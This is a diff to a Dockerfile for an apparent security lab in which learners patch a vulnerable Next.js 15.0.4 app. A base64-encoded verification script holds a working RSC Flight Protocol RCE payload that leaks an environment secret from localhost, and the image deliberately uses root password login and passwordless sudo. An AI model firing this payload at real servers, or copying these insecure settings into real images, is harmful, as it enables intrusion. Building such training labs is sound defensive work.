@@ -1,20 +1,40 @@
+# ============================================================
+# LAB-RCE-DEFENSE: Next.js RSC Flight Protocol RCE Challenge
+# ============================================================
+# Vulnerable: Next.js 15.0.4 (RSC Flight Protocol RCE)
+# Goal:       Upgrade Next.js to a patched version
+# Verify:     Run 'submit' to check if the RCE is fixed
+# ============================================================
+
 FROM ubuntu:24.04
 
 ENV DEBIAN_FRONTEND=noninteractive
 ENV TZ=Asia/Bangkok
 ENV NODE_ENV=development
 
+# -----------------------------------------------------------
+# 1. Base system setup (full Ubuntu with dev tools)
+# -----------------------------------------------------------
 RUN apt-get update \
     && apt-get install -y unminimize \
     && rm -rf /var/lib/apt/lists/* \
     && yes | unminimize
 
 RUN apt-get update && apt-get upgrade -y && \
-    apt-get install -y openssh-server apt-file apt-utils iproute2 iputils-ping sudo htop iputils* acl tzdata net-tools vim nano acl curl git tini tmux
+    apt-get install -y \
+    openssh-server apt-file apt-utils iproute2 iputils-ping \
+    sudo htop iputils* acl tzdata net-tools vim nano curl git \
+    tini tmux jq
 
+# -----------------------------------------------------------
+# 2. Install Node.js 20 LTS
+# -----------------------------------------------------------
 RUN curl -fsSL https://nodejs.org/dist/v20.18.0/node-v20.18.0-linux-x64.tar.gz \
     | tar -xzf - -C /usr/local --strip-components=1 --no-same-owner
 
+# -----------------------------------------------------------
+# 3. Create lab user
+# -----------------------------------------------------------
 RUN useradd -m -s /bin/bash secspace && \
     echo 'secspace:secspace' | chpasswd && \
     usermod -aG sudo secspace && \
@@ -22,6 +42,9 @@ RUN useradd -m -s /bin/bash secspace && \
     echo 'root:supersecret_password' | chpasswd && \
     usermod -U root
 
+# -----------------------------------------------------------
+# 4. SSH server config
+# -----------------------------------------------------------
 RUN mkdir /var/run/sshd && \
     sed -i 's/^#\(PermitRootLogin \).*/\1yes/' /etc/ssh/sshd_config && \
     sed -i 's/^#\(PasswordAuthentication \).*/\1yes/' /etc/ssh/sshd_config && \
@@ -31,6 +54,10 @@ RUN mkdir /var/run/sshd && \
 
 RUN echo 'secspace ALL=(ALL) NOPASSWD: ALL' | tee -a /etc/sudoers
 
+# -----------------------------------------------------------
+# 5. Create VULNERABLE Next.js app (v15.0.4)
+#    This version is vulnerable to RSC Flight Protocol RCE
+# -----------------------------------------------------------
 WORKDIR /home/secspace
 
 RUN npm exec -- create-next-app@15.0.4 app \
@@ -45,18 +72,45 @@ RUN npm exec -- create-next-app@15.0.4 app \
     && chown -R secspace:secspace app
 
 USER secspace
-
 WORKDIR /home/secspace/app
 
 RUN npm install
 
+# -----------------------------------------------------------
+# 6. Place the secret flag (RCE target)
+# -----------------------------------------------------------
 RUN echo "cve{nextjs-flight-protocol-issue-defended}" > .rng_secret
 
 USER root
 
-RUN echo "IyEvYmluL2Jhc2gKIyBHZXQgdGhlIHNlY3JldCBmcm9tIHRoZSBwcm90ZWN0ZWQgZmlsZQpTRUNSRVQ9JChjYXQgL2hvbWUvc2Vjc3BhY2UvYXBwLy5ybmdfc2VjcmV0IDI+L2Rldi9udWxsKQoKIyBQYXlsb2FkIGZvciB0aGUgTmV4dC5qcyBSU0MgRmxpZ2h0IFByb3RvY29sIFJDRSBhdHRhY2sKUEFZTE9BRD0neyJ0aGVuIjoiJDE6X19wcm90b19fOnRoZW4iLCJzdGF0dXMiOiJyZXNvbHZlZF9tb2RlbCIsInJlYXNvbiI6LTEsInZhbHVlIjoie1widGhlblwiOlwiJEIxMzM3XCJ9IiwiX3Jlc3BvbnNlIjp7Il9wcmVmaXgiOiJ2YXIgcmVzPXByb2Nlc3MuZW52LlJOR19TRUNSRVQ7dGhyb3cgT2JqZWN0LmFzc2lnbihuZXcgRXJyb3IoXCJ4XCIpLHtkaWdlc3Q6IHJlc30pOyIsIl9jaHVua3MiOiIkUTIiLCJfZm9ybURhdGEiOnsiZ2V0IjoiJDE6Y29uc3RydWN0b3I6Y29uc3RydWN0b3IifX19JwoKIyBTZW5kIHRoZSBhdHRhY2sgcmVxdWVzdApSRVNVTFQ9JChjdXJsIC1zIC1YIFBPU1QgImh0dHA6Ly9sb2NhbGhvc3Q6MzAwMC9hZGZhIiBcCiAgLUggIk5leHQtQWN0aW9uOiB4IiBcCiAgLUYgIjA9JFBBWUxPQUQiIFwKICAtRiAnMT0iJEAwIicgXAogIC1GICcyPVtdJykKCiMgQ2hlY2sgaWYgdGhlIHNlY3JldCB3YXMgc3VjY2Vzc2Z1bGx5IGxlYWtlZCBpbiB0aGUgcmVzdWx0CmlmIGVjaG8gIiRSRVNVTFQiIHwgZ3JlcCAtcSAiJFNFQ1JFVCI7IHRoZW4KICBlY2hvIC1uZSAiXGVbMzFtSW5jb3JyZWN0XGVbMG1cbiIKZWxzZQogIGVjaG8gLW5lICJcZVszMm1Db3JyZWN0XGVbMG1cbiIKZmk=" \
+# -----------------------------------------------------------
+# 7. Install submit verification script
+#    Decodes from base64 → /usr/local/bin/submit
+#    The script:
+#      [1/3] Detects installed Next.js version
+#      [2/3] Checks if dev server is running (with retries)
+#      [3/3] Sends RSC Flight Protocol RCE payload
+#      → If secret leaked:  FAILED  (still vulnerable)
+#      → If secret safe:    PASSED  (patched!)
+# -----------------------------------------------------------
+RUN echo "IyEvYmluL2Jhc2gKClJFRD0nXGVbMzFtJwpHUkVFTj0nXGVbMzJtJwpZRUxMT1c9J1xlWzMzbScKQ1lBTj0nXGVbMzZtJwpCT0xEPSdcZVsxbScKTkM9J1xlWzBtJwoKZWNobyAiIgplY2hvIC1lICIke0NZQU59JHtCT0xEfT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0ke05DfSIKZWNobyAtZSAiJHtDWUFOfSR7Qk9MRH0gIE5leHQuanMgUkNFIERlZmVuc2UgLSBWZXJpZmljYXRpb24gU2NyaXB0JHtOQ30iCmVjaG8gLWUgIiR7Q1lBTn0ke0JPTER9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSR7TkN9IgplY2hvICIiCgplY2hvIC1lICIke0JPTER9WzEvM10gRGV0ZWN0aW5nIE5leHQuanMgdmVyc2lvbi4uLiR7TkN9IgpORVhUX1ZFUlNJT049JChjZCAvaG9tZS9zZWNzcGFjZS9hcHAgJiYgbm9kZSAtZSAidHJ5e2NvbnNvbGUubG9nKHJlcXVpcmUoJ25leHQvcGFja2FnZS5qc29uJykudmVyc2lvbil9Y2F0Y2goZSl7Y29uc29sZS5sb2coJ3Vua25vd24nKX0iIDI+L2Rldi9udWxsKQplY2hvIC1lICIgICAgICBJbnN0YWxsZWQ6IE5leHQuanMgdiR7Q1lBTn0ke05FWFRfVkVSU0lPTn0ke05DfSIKZWNobyAiIgoKZWNobyAtZSAiJHtCT0xEfVsyLzNdIENoZWNraW5nIHNlcnZlciBzdGF0dXMuLi4ke05DfSIKTUFYX1JFVFJJRVM9NQpSRVRSWT0wClNFUlZFUl9PSz1mYWxzZQoKd2hpbGUgWyAkUkVUUlkgLWx0ICRNQVhfUkVUUklFUyBdOyBkbwogIENPREU9JChjdXJsIC1zIC1vIC9kZXYvbnVsbCAtdyAiJXtodHRwX2NvZGV9IiBodHRwOi8vbG9jYWxob3N0OjMwMDAvIDI+L2Rldi9udWxsKQogIGlmIFsgIiRDT0RFIiAhPSAiMDAwIiBdOyB0aGVuCiAgICBTRVJWRVJfT0s9dHJ1ZQogICAgYnJlYWsKICBmaQogIFJFVFJZPSQoKFJFVFJZICsgMSkpCiAgZWNobyAiICAgICAgUmV0cnkgJFJFVFJZLyRNQVhfUkVUUklFUyAtIHdhaXRpbmcgZm9yIHNlcnZlci4uLiIKICBzbGVlcCAzCmRvbmUKCmlmIFsgIiRTRVJWRVJfT0siID0gZmFsc2UgXTsgdGhlbgogIGVjaG8gIiIKICBlY2hvIC1lICIke1lFTExPV31bIV0gU2VydmVyIG5vdCBydW5uaW5nIG9uIHBvcnQgMzAwMCR7TkN9IgogIGVjaG8gLWUgIiR7WUVMTE9XfSAgICBQbGVhc2Ugc3RhcnQgdGhlIGRldiBzZXJ2ZXIgZmlyc3Q6JHtOQ30iCiAgZWNobyAtZSAiJHtZRUxMT1d9ICAgICAgY2Qgfi9hcHAgJiYgbnBtIHJ1biBkZXYke05DfSIKICBlY2hvICIiCiAgZWNobyAtZSAiJHtZRUxMT1d9ICAgIE9yIHJlc3RhcnQgdG11eCBzZXNzaW9uOiR7TkN9IgogIGVjaG8gLWUgIiR7WUVMTE9XfSAgICAgIHRtdXgga2lsbC1zZXNzaW9uIC10IG5leHRqcyAyPi9kZXYvbnVsbCR7TkN9IgogIGVjaG8gLWUgIiR7WUVMTE9XfSAgICAgIGNkIH4vYXBwICYmIG5wbSBydW4gZGV2ICYke05DfSIKICBleGl0IDEKZmkKCmVjaG8gLWUgIiAgICAgIFNlcnZlciByZXNwb25kaW5nIChIVFRQICRDT0RFKSIKZWNobyAiIgoKZWNobyAtZSAiJHtCT0xEfVszLzNdIFRlc3RpbmcgUlNDIEZsaWdodCBQcm90b2NvbCBSQ0UuLi4ke05DfSIKU0VDUkVUPSQoY2F0IC9ob21lL3NlY3NwYWNlL2FwcC8ucm5nX3NlY3JldCAyPi9kZXYvbnVsbCkKaWYgWyAteiAiJFNFQ1JFVCIgXTsgdGhlbgogIGVjaG8gLWUgIiR7UkVEfVshXSBDYW5ub3QgcmVhZCBzZWNyZXQgZmlsZSAoLnJuZ19zZWNyZXQpJHtOQ30iCiAgZXhpdCAxCmZpCgpQQVlMT0FEPSd7InRoZW4iOiIkMTpfX3Byb3RvX186dGhlbiIsInN0YXR1cyI6InJlc29sdmVkX21vZGVsIiwicmVhc29uIjotMSwidmFsdWUiOiJ7XCJ0aGVuXCI6XCIkQjEzMzdcIn0iLCJfcmVzcG9uc2UiOnsiX3ByZWZpeCI6InZhciByZXM9cHJvY2Vzcy5lbnYuUk5HX1NFQ1JFVDt0aHJvdyBPYmplY3QuYXNzaWduKG5ldyBFcnJvcihcInhcIikse2RpZ2VzdDogcmVzfSk7IiwiX2NodW5rcyI6IiRRMiIsIl9mb3JtRGF0YSI6eyJnZXQiOiIkMTpjb25zdHJ1Y3Rvcjpjb25zdHJ1Y3RvciJ9fX0nCgpSRVNVTFQ9JChjdXJsIC1zIC1YIFBPU1QgImh0dHA6Ly9sb2NhbGhvc3Q6MzAwMC9fX3JjZV90ZXN0IiBcCiAgLUggIk5leHQtQWN0aW9uOiB4IiBcCiAgLUYgIjA9JFBBWUxPQUQiIFwKICAtRiAnMT0iJEAwIicgXAogIC1GICcyPVtdJyBcCiAgLS1tYXgtdGltZSAxMCAyPi9kZXYvbnVsbCkKCmVjaG8gIiIKCmlmIGVjaG8gIiRSRVNVTFQiIHwgZ3JlcCAtcSAiJFNFQ1JFVCI7IHRoZW4KICBlY2hvIC1lICIke1JFRH0ke0JPTER9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0ke05DfSIKICBlY2hvIC1lICIke1JFRH0ke0JPTER9ICAgICAgIFggIFZFUklGSUNBVElPTiBGQUlMRUQke05DfSIKICBlY2hvIC1lICIke1JFRH0ke0JPTER9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0ke05DfSIKICBlY2hvIC1lICIke1JFRH0gIFJDRSBzdWNjZWVkZWQgLSBzZWNyZXQgd2FzIGxlYWtlZCEke05DfSIKICBlY2hvIC1lICIke1JFRH0gIE5leHQuanMgdiR7TkVYVF9WRVJTSU9OfSBpcyBzdGlsbCB2dWxuZXJhYmxlLiR7TkN9IgogIGVjaG8gIiIKICBlY2hvIC1lICIke1JFRH0gIEhpbnQ6IFVwZ3JhZGUgTmV4dC5qcyB0aGVuIHJlc3RhcnQgdGhlJHtOQ30iCiAgZWNobyAtZSAiJHtSRUR9ICBkZXZlbG9wbWVudCBzZXJ2ZXIgYW5kIHJ1biBzdWJtaXQgYWdhaW4uJHtOQ30iCiAgZWNobyAtZSAiJHtSRUR9JHtCT0xEfT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09JHtOQ30iCiAgZXhpdCAxCmVsc2UKICBlY2hvIC1lICIke0dSRUVOfSR7Qk9MRH09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSR7TkN9IgogIGVjaG8gLWUgIiR7R1JFRU59JHtCT0xEfSAgICAgICBPICBWRVJJRklDQVRJT04gUEFTU0VEJHtOQ30iCiAgZWNobyAtZSAiJHtHUkVFTn0ke0JPTER9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0ke05DfSIKICBlY2hvIC1lICIke0dSRUVOfSAgUkNFIGJsb2NrZWQgLSBzZWNyZXQgaXMgcHJvdGVjdGVkISR7TkN9IgogIGVjaG8gLWUgIiR7R1JFRU59ICBOZXh0LmpzIGlzIG5vIGxvbmdlciB2dWxuZXJhYmxlLiR7TkN9IgogIGVjaG8gLWUgIiR7R1JFRU59JHtCT0xEfT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09JHtOQ30iCiAgZXhpdCAwCmZpCg==" \
     | base64 -d > /usr/local/bin/submit \
     && chmod +x /usr/local/bin/submit
+
+# -----------------------------------------------------------
+# 8. Helper script: restart dev server after upgrade
+# -----------------------------------------------------------
+RUN echo '#!/bin/bash' > /usr/local/bin/restart-app && \
+    echo 'echo "Stopping existing Next.js server..."' >> /usr/local/bin/restart-app && \
+    echo 'tmux kill-session -t nextjs 2>/dev/null' >> /usr/local/bin/restart-app && \
+    echo 'sleep 1' >> /usr/local/bin/restart-app && \
+    echo 'echo "Starting Next.js dev server..."' >> /usr/local/bin/restart-app && \
+    echo 'export RNG_SECRET=$(cat /home/secspace/app/.rng_secret)' >> /usr/local/bin/restart-app && \
+    echo 'cd /home/secspace/app && tmux new-session -d -s nextjs "export RNG_SECRET=$(cat /home/secspace/app/.rng_secret) && npm run dev"' >> /usr/local/bin/restart-app && \
+    echo 'echo "Waiting for server to start..."' >> /usr/local/bin/restart-app && \
+    echo 'sleep 5' >> /usr/local/bin/restart-app && \
+    echo 'echo "Done! Run: submit"' >> /usr/local/bin/restart-app && \
+    chmod +x /usr/local/bin/restart-app
 
 EXPOSE 22 3000
 
